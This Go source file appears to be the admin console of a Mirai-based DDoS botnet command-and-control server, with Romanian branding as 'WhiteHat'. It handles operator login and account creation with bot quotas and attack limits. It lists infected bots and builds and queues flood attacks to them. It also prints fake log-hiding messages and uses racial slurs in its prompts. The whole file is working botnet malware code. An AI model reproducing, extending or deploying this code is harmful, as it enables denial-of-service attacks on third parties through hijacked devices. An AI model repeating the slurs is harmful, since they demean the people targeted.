package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("\033[0;37m         [\033[0;31mWhiteHat-Private Net\033[0;37m] \r\n"))
	this.conn.Write([]byte("			\033[0;31mPersoanele neautorizate sa pofteasca afara.\r\n"))
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[0;31m  User\033[0;37m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[0;31m  Parola\033[0;37m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
	spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r   \033[0;91   SServer-ul se incarca\033[0;37m... \033[31m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("\r\n\033[0m"))
    this.conn.Write([]byte("\033[0;31m[\033[0;37mChecker\033[0;31m] \033[0;36mWhiteHat \033[0;33m| \033[0;32mFiltru Logare In Terminal\r\n"))
    time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("\033[0;31m[\033[0;37mChecker\033[0;31m] \033[0;36mWhiteHat \033[0;33m| \033[0;32mAscundem conexiunile UTmp+WTmp...\r\n"))
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("\033[0;31m[\033[0;37mChecker\033[0;31m] \033[0;36mWhiteHat \033[0;33m| \033[0;32mOprim PortScanning-ul de la NMap+NetStat...\r\n"))
    time.Sleep(150 * time.Millisecond)
    this.conn.Write([]byte("\033[0;31m[\033[0;37mChecker\033[0;31m] \033[0;36mWhiteHat \033[0;33m| \033[0;32mStergem toate urmele din LD_PRELOAD...\r\n"))
    for i := 0; i < 4; i++ {
        time.Sleep(100 * time.Millisecond)
    this.conn.Write([]byte(fmt.Sprintf("\033[0;31m[\033[0;37mChecker\033[0;31m] \033[0;36mWhiteHat \033[0;33m| \033[0;32mStergem env libc.poison.so.%d\r\n", i + 1)))
    }
    this.conn.Write([]byte("\033[0;31m[\033[0;37mChecker\033[0;31m] \033[0;36mWhiteHat \033[0;33m| \033[0;32mInitializam Terminalul WhiteHat...\r\n"))
    time.Sleep(1 * time.Second)


    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\033[0;91 Datele de autentificare au fost eronate.\r\n"))
        this.conn.Write([]byte("\r\033[0;91 Nu ai un cont pe acest BotNet. (apasa orice tasta)\033[0m\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

			this.conn.Write([]byte("\033[0;37m\r\n"))
			this.conn.Write([]byte("\033[0;37m\r\n"))
    		this.conn.Write([]byte("\033[0;37m  ╔════════════════════════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m01101111010101100010\033[1;37m████████\033[0;32m101001101010\033[1;37m████████\033[0;32m01010111010101001000\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m1010101010101010001\033[1;37m████████████\033[0;32m0101011\033[1;37m███████████\033[0;32m0101110110101001000\033[0;37m║\r\n"))
            this.conn.Write([]byte("\033[0;37m  ║\033[0;32m000101110101101001\033[1;37m████████████████████████████████\033[0;32m010101001001001001\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m11101010010110111\033[1;37m██████████████████████████████████\033[0;32m10010110001110011\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m0101011001110110\033[1;37m█████████████\033[0;32m1\033[1;37mWhite Hat\033[0;32m0\033[1;37m████████████\033[0;32m1011101011110011\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m101010101010010\033[1;37m██████████████████████████████████████\033[0;32m010110011001010\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m010101110100010\033[1;37m██████████████████████████████████████\033[0;32m110010101000101\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m011001001000101\033[0;37m██████████████████████████████████████\033[0;32m011010010001010\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m111010010010010\033[0;37m██████████████████████████████████████\033[0;32m111010001011011\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m0101\033[0;36mRelisys\033[0;32m1101\033[1;37m██████████████████████████████████████\033[0;32m00\033[0;36mUzzYSenpai\033[0;32m101\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m11\033[1;37m████████████████████████████████████████████████████████████████\033[0;32m01\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m01\033[1;37m████████████████████████████████████████████████████████████████\033[0;32m10\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m00\033[1;37m████████████████████████████████████████████████████████████████\033[0;32m11\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m011011011\033[1;37m██████████████████████████████████████████████████\033[0;32m101101101\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m1010\033[0;31mMirai\033[0;32m01\033[0;31mPrivat\033[0;32m1011100110\033[0;31mPersoanele\033[0;32m111\033[0;31mNeautorizate\033[0;32m101\033[0;31mAuto-DDOS\033[0;32m1011\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ╚════════════════════════════════════════════════════════════════════╝\r\n"))                                                                               
            this.conn.Write([]byte("\033[0;37m\r\n"))
			this.conn.Write([]byte("\033[0;37m\r\n"))

    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Anonimii WhiteHat | UzzYSenpai & Relisys | WhiteHat - Connectat ca - %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()

    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte(" \033[0;37m[\033[0;31mCyberKiller\033[0;37m] \033[1;37m" + username + "\033[1;30m < - > \033[1;37mWhiteHat \033[0;36m☢> \033[0;31m"))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
		if err != nil || cmd == "cls" || cmd == "clear" {
			this.conn.Write([]byte("\033[0;37m\r\n"))
			this.conn.Write([]byte("\033[0;37m\r\n"))
    		this.conn.Write([]byte("\033[0;37m  ╔════════════════════════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m01101111010101100010\033[1;37m████████\033[0;32m101001101010\033[1;37m████████\033[0;32m01010111010101001000\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m1010101010101010001\033[1;37m████████████\033[0;32m0101011\033[1;37m███████████\033[0;32m0101110110101001000\033[0;37m║\r\n"))
            this.conn.Write([]byte("\033[0;37m  ║\033[0;32m000101110101101001\033[1;37m████████████████████████████████\033[0;32m010101001001001001\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m11101010010110111\033[1;37m██████████████████████████████████\033[0;32m10010110001110011\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m0101011001110110\033[1;37m█████████████\033[0;32m1\033[1;37mWhite Hat\033[0;32m0\033[1;37m████████████\033[0;32m1011101011110011\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m101010101010010\033[1;37m██████████████████████████████████████\033[0;32m010110011001010\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m010101110100010\033[1;37m██████████████████████████████████████\033[0;32m110010101000101\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m011001001000101\033[0;37m██████████████████████████████████████\033[0;32m011010010001010\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m111010010010010\033[0;37m██████████████████████████████████████\033[0;32m111010001011011\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m0101\033[0;36mRelisys\033[0;32m1101\033[1;37m██████████████████████████████████████\033[0;32m00\033[0;36mUzzYSenpai\033[0;32m101\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m11\033[1;37m████████████████████████████████████████████████████████████████\033[0;32m01\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m01\033[1;37m████████████████████████████████████████████████████████████████\033[0;32m10\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m00\033[1;37m████████████████████████████████████████████████████████████████\033[0;32m11\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m011011011\033[1;37m██████████████████████████████████████████████████\033[0;32m101101101\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ║\033[0;32m1010\033[0;31mMirai\033[0;32m01\033[0;31mPrivat\033[0;32m1011100110\033[0;31mPersoanele\033[0;32m111\033[0;31mNeautorizate\033[0;32m101\033[0;31mAuto-DDOS\033[0;32m1011\033[0;37m║\r\n"))
			this.conn.Write([]byte("\033[0;37m  ╚════════════════════════════════════════════════════════════════════╝\r\n"))                                                                               
            this.conn.Write([]byte("\033[0;37m\r\n"))
			this.conn.Write([]byte("\033[0;37m\r\n"))
			continue
		}

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Enter That Fucker's Name: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Choose His Fucking Password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m How Much Bots Does This Nigger Get (-1 For Full Net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Parse The Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m How Long Can This Nigger Hit For (-1 For None): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[0;37%s\033[0m\r\n", "Failed To Parse The Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Nigger's Cooldown Time (0 For None): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Parse The Cooldown")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m New Account Info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBotcount: " + max_bots_str + "\r\nReady For This Shit? (Y/N): "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Create New User. An Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Fucker Added Successfully.\033[0m\r\n"))
            }
            continue
        }
        if cmd == "botcount" || cmd == "bots" || cmd == "count" {
		botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s: \x1b[0;36m%d\033[0m\r\n\033[0m", k, v)))
            }
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30mBotii in total: \x1b[0;36m%d\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
